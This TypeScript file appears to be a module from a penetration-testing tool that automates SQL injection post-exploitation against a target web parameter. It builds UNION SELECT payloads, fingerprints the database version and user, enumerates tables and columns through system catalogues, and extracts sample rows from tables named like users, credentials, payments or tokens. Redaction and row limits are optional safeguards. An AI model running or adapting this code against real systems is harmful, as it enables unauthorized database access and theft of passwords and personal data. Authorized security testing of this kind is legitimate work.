/**
 * SQLi Post-Exploitation Module
 * 
 * Provides proof of data exfiltration capability after SQLi is confirmed.
 * Uses read-only queries with strict limits to prove access without damage.
 */

import { createHash } from "crypto";
import { ValidatingHttpClient, type ValidationContext } from "../../validation/validating-http-client";

export interface SqliExploitConfig {
  targetUrl: string;
  parameterName: string;
  parameterLocation: "url_param" | "body_param" | "cookie";
  httpMethod: "GET" | "POST";
  basePayload: string;
  dbType: "mysql" | "postgresql" | "mssql" | "oracle" | "sqlite" | "unknown";
  headers?: Record<string, string>;
}

export interface DatabaseFingerprint {
  dbType: string;
  version: string;
  user: string;
  database: string;
  hostname?: string;
  confidence: number;
}

export interface SchemaEnumeration {
  tables: TableInfo[];
  sensitiveTablesFound: string[];
  totalTables: number;
  enumerated: number;
}

export interface TableInfo {
  name: string;
  columns: ColumnInfo[];
  estimatedRows?: number;
  sensitivityScore: number;
}

export interface ColumnInfo {
  name: string;
  type?: string;
  isSensitive: boolean;
}

export interface DataSample {
  tableName: string;
  rowCount: number;
  columns: string[];
  sampleData: Record<string, string>[];
  dataHash: string;
  redacted: boolean;
}

export interface SqliPostExploitResult {
  success: boolean;
  fingerprint?: DatabaseFingerprint;
  schema?: SchemaEnumeration;
  dataSamples?: DataSample[];
  evidence: string;
  proofArtifacts: ProofArtifact[];
  executionTimeMs: number;
}

interface ProofArtifact {
  type: string;
  description: string;
  data: string;
  hash: string;
  capturedAt: Date;
}

const SENSITIVE_COLUMN_PATTERNS = [
  /password/i, /passwd/i, /pwd/i,
  /secret/i, /token/i, /api_key/i, /apikey/i,
  /credit_card/i, /creditcard/i, /cc_num/i,
  /ssn/i, /social_security/i,
  /private_key/i, /privatekey/i,
  /session/i, /auth/i,
  /email/i, /phone/i,
];

const SENSITIVE_TABLE_PATTERNS = [
  /user/i, /account/i, /member/i, /customer/i,
  /password/i, /credential/i, /auth/i,
  /payment/i, /transaction/i, /order/i,
  /session/i, /token/i,
  /admin/i, /config/i, /setting/i,
];

export class SqliPostExploitModule {
  private httpClient: ValidatingHttpClient;
  private context?: ValidationContext;
  
  constructor(context?: ValidationContext) {
    this.httpClient = new ValidatingHttpClient({ timeout: 15000 });
    this.context = context;
  }
  
  async fingerprint(config: SqliExploitConfig): Promise<DatabaseFingerprint | null> {
    const queries = this.getFingerprintQueries(config.dbType);
    const results: Record<string, string> = {};
    
    for (const [field, query] of Object.entries(queries)) {
      try {
        const result = await this.executeQuery(config, query);
        if (result) {
          results[field] = result;
        }
      } catch {
        continue;
      }
    }
    
    if (Object.keys(results).length === 0) {
      return null;
    }
    
    return {
      dbType: config.dbType,
      version: results.version || "unknown",
      user: results.user || "unknown",
      database: results.database || "unknown",
      hostname: results.hostname,
      confidence: Math.min(100, Object.keys(results).length * 25),
    };
  }
  
  async enumerateSchema(
    config: SqliExploitConfig,
    options: { maxTables?: number; sensitiveOnly?: boolean } = {}
  ): Promise<SchemaEnumeration | null> {
    const maxTables = options.maxTables || 20;
    const query = this.getSchemaEnumQuery(config.dbType, maxTables);
    
    try {
      const rawResult = await this.executeQuery(config, query);
      if (!rawResult) return null;
      
      const tableNames = this.parseTableList(rawResult);
      const tables: TableInfo[] = [];
      const sensitiveTablesFound: string[] = [];
      
      for (const tableName of tableNames.slice(0, maxTables)) {
        const isSensitive = SENSITIVE_TABLE_PATTERNS.some(p => p.test(tableName));
        if (options.sensitiveOnly && !isSensitive) continue;
        
        if (isSensitive) {
          sensitiveTablesFound.push(tableName);
        }
        
        const columns = await this.enumerateColumns(config, tableName);
        const sensitivityScore = this.calculateSensitivityScore(tableName, columns);
        
        tables.push({
          name: tableName,
          columns,
          sensitivityScore,
        });
      }
      
      return {
        tables,
        sensitiveTablesFound,
        totalTables: tableNames.length,
        enumerated: tables.length,
      };
    } catch {
      return null;
    }
  }
  
  async extractDataSample(
    config: SqliExploitConfig,
    tableName: string,
    options: { maxRows?: number; redact?: boolean } = {}
  ): Promise<DataSample | null> {
    const maxRows = Math.min(options.maxRows || 3, 5);
    const query = this.getDataExtractionQuery(config.dbType, tableName, maxRows);
    
    try {
      const rawResult = await this.executeQuery(config, query);
      if (!rawResult) return null;
      
      const parsed = this.parseDataResult(rawResult);
      if (!parsed) return null;
      
      let sampleData = parsed.rows;
      const redacted = options.redact ?? true;
      
      if (redacted) {
        sampleData = this.redactSensitiveData(sampleData, parsed.columns);
      }
      
      const dataHash = createHash("sha256")
        .update(JSON.stringify(sampleData))
        .digest("hex");
      
      return {
        tableName,
        rowCount: sampleData.length,
        columns: parsed.columns,
        sampleData,
        dataHash,
        redacted,
      };
    } catch {
      return null;
    }
  }
  
  async runFullExploitation(
    config: SqliExploitConfig,
    options: {
      skipFingerprint?: boolean;
      skipSchema?: boolean;
      skipData?: boolean;
      maxTables?: number;
      maxRows?: number;
      redact?: boolean;
    } = {}
  ): Promise<SqliPostExploitResult> {
    const startTime = Date.now();
    const proofArtifacts: ProofArtifact[] = [];
    const evidence: string[] = [];
    
    let fingerprint: DatabaseFingerprint | undefined;
    let schema: SchemaEnumeration | undefined;
    const dataSamples: DataSample[] = [];
    
    // Step 1: Database fingerprinting
    if (!options.skipFingerprint) {
      fingerprint = await this.fingerprint(config) || undefined;
      if (fingerprint) {
        evidence.push(`Database: ${fingerprint.dbType} ${fingerprint.version}, User: ${fingerprint.user}`);
        proofArtifacts.push({
          type: "database_fingerprint",
          description: "Database version and user identification",
          data: JSON.stringify(fingerprint),
          hash: createHash("sha256").update(JSON.stringify(fingerprint)).digest("hex"),
          capturedAt: new Date(),
        });
      }
    }
    
    // Step 2: Schema enumeration
    if (!options.skipSchema) {
      schema = await this.enumerateSchema(config, { 
        maxTables: options.maxTables,
        sensitiveOnly: true,
      }) || undefined;
      
      if (schema) {
        evidence.push(`Found ${schema.totalTables} tables, ${schema.sensitiveTablesFound.length} sensitive`);
        proofArtifacts.push({
          type: "schema_enumeration",
          description: `Enumerated ${schema.enumerated} tables`,
          data: JSON.stringify(schema.tables.map(t => ({ name: t.name, columns: t.columns.length }))),
          hash: createHash("sha256").update(JSON.stringify(schema)).digest("hex"),
          capturedAt: new Date(),
        });
      }
    }
    
    // Step 3: Data extraction (limited)
    if (!options.skipData && schema?.sensitiveTablesFound.length) {
      for (const tableName of schema.sensitiveTablesFound.slice(0, 2)) {
        const sample = await this.extractDataSample(config, tableName, {
          maxRows: options.maxRows || 3,
          redact: options.redact ?? true,
        });
        
        if (sample) {
          dataSamples.push(sample);
          evidence.push(`Extracted ${sample.rowCount} rows from ${tableName}`);
          proofArtifacts.push({
            type: "data_sample",
            description: `Sample data from ${tableName}`,
            data: sample.redacted ? "[REDACTED]" : JSON.stringify(sample.sampleData),
            hash: sample.dataHash,
            capturedAt: new Date(),
          });
        }
      }
    }
    
    const success = !!(fingerprint || schema || dataSamples.length > 0);
    
    return {
      success,
      fingerprint,
      schema,
      dataSamples: dataSamples.length > 0 ? dataSamples : undefined,
      evidence: evidence.join("; "),
      proofArtifacts,
      executionTimeMs: Date.now() - startTime,
    };
  }
  
  // ---------------------------------------------------------------------------
  // Private Helpers
  // ---------------------------------------------------------------------------
  
  private async executeQuery(config: SqliExploitConfig, sqlFragment: string): Promise<string | null> {
    const payload = this.buildPayload(config.basePayload, sqlFragment, config.dbType);
    
    const url = new URL(config.targetUrl);
    let requestUrl = url.toString();
    let body: string | undefined;
    const headers: Record<string, string> = { ...config.headers };
    
    if (config.parameterLocation === "url_param") {
      url.searchParams.set(config.parameterName, payload);
      requestUrl = url.toString();
    } else if (config.parameterLocation === "body_param") {
      body = `${config.parameterName}=${encodeURIComponent(payload)}`;
      headers["Content-Type"] = "application/x-www-form-urlencoded";
    }
    
    try {
      const { response } = await this.httpClient.request({
        method: config.httpMethod,
        url: requestUrl,
        headers,
        body,
      }, this.context);
      
      return this.extractQueryResult(response.body);
    } catch {
      return null;
    }
  }
  
  private buildPayload(basePayload: string, sqlFragment: string, dbType: string): string {
    const commentChar = dbType === "mysql" ? "#" : "--";
    return `${basePayload}' UNION SELECT ${sqlFragment}${commentChar}`;
  }
  
  private extractQueryResult(responseBody: string): string | null {
    const patterns = [
      /<td[^>]*>([^<]+)<\/td>/gi,
      /"result"\s*:\s*"([^"]+)"/gi,
      /\|([^|]+)\|/g,
    ];
    
    for (const pattern of patterns) {
      const match = pattern.exec(responseBody);
      if (match?.[1]) {
        return match[1].trim();
      }
    }
    
    return responseBody.length > 0 && responseBody.length < 1000 ? responseBody : null;
  }
  
  private getFingerprintQueries(dbType: string): Record<string, string> {
    switch (dbType) {
      case "mysql":
        return {
          version: "@@version,NULL,NULL",
          user: "user(),NULL,NULL",
          database: "database(),NULL,NULL",
        };
      case "postgresql":
        return {
          version: "version(),NULL,NULL",
          user: "current_user,NULL,NULL",
          database: "current_database(),NULL,NULL",
        };
      case "mssql":
        return {
          version: "@@version,NULL,NULL",
          user: "SYSTEM_USER,NULL,NULL",
          database: "DB_NAME(),NULL,NULL",
        };
      default:
        return {
          version: "'1',NULL,NULL",
        };
    }
  }
  
  private getSchemaEnumQuery(dbType: string, limit: number): string {
    switch (dbType) {
      case "mysql":
        return `table_name,NULL,NULL FROM information_schema.tables WHERE table_schema=database() LIMIT ${limit}`;
      case "postgresql":
        return `table_name,NULL,NULL FROM information_schema.tables WHERE table_schema='public' LIMIT ${limit}`;
      case "mssql":
        return `TOP ${limit} name,NULL,NULL FROM sysobjects WHERE xtype='U'`;
      default:
        return `name,NULL,NULL FROM sqlite_master WHERE type='table' LIMIT ${limit}`;
    }
  }
  
  private getDataExtractionQuery(dbType: string, tableName: string, limit: number): string {
    return `* FROM ${tableName} LIMIT ${limit}`;
  }
  
  private parseTableList(raw: string): string[] {
    return raw.split(/[,\n|]/).map(s => s.trim()).filter(Boolean);
  }
  
  private async enumerateColumns(config: SqliExploitConfig, tableName: string): Promise<ColumnInfo[]> {
    const query = this.getColumnEnumQuery(config.dbType, tableName);
    const result = await this.executeQuery(config, query);
    
    if (!result) return [];
    
    return result.split(/[,\n|]/).map(name => ({
      name: name.trim(),
      isSensitive: SENSITIVE_COLUMN_PATTERNS.some(p => p.test(name)),
    })).filter(c => c.name);
  }
  
  private getColumnEnumQuery(dbType: string, tableName: string): string {
    switch (dbType) {
      case "mysql":
        return `column_name,NULL,NULL FROM information_schema.columns WHERE table_name='${tableName}' LIMIT 20`;
      case "postgresql":
        return `column_name,NULL,NULL FROM information_schema.columns WHERE table_name='${tableName}' LIMIT 20`;
      default:
        return `name,NULL,NULL FROM pragma_table_info('${tableName}') LIMIT 20`;
    }
  }
  
  private calculateSensitivityScore(tableName: string, columns: ColumnInfo[]): number {
    let score = 0;
    
    if (SENSITIVE_TABLE_PATTERNS.some(p => p.test(tableName))) {
      score += 50;
    }
    
    const sensitiveColumns = columns.filter(c => c.isSensitive).length;
    score += sensitiveColumns * 10;
    
    return Math.min(100, score);
  }
  
  private parseDataResult(raw: string): { columns: string[]; rows: Record<string, string>[] } | null {
    try {
      const parsed = JSON.parse(raw);
      if (Array.isArray(parsed)) {
        const columns = Object.keys(parsed[0] || {});
        return { columns, rows: parsed };
      }
    } catch {
      // Not JSON, try other formats
    }
    
    const lines = raw.split("\n").filter(Boolean);
    if (lines.length < 2) return null;
    
    const columns = lines[0].split(/[,|]/).map(s => s.trim());
    const rows = lines.slice(1).map(line => {
      const values = line.split(/[,|]/).map(s => s.trim());
      const row: Record<string, string> = {};
      columns.forEach((col, i) => {
        row[col] = values[i] || "";
      });
      return row;
    });
    
    return { columns, rows };
  }
  
  private redactSensitiveData(rows: Record<string, string>[], columns: string[]): Record<string, string>[] {
    return rows.map(row => {
      const redacted = { ...row };
      for (const col of columns) {
        if (SENSITIVE_COLUMN_PATTERNS.some(p => p.test(col))) {
          if (redacted[col]) {
            redacted[col] = `[REDACTED:${redacted[col].length} chars]`;
          }
        }
      }
      return redacted;
    });
  }
}
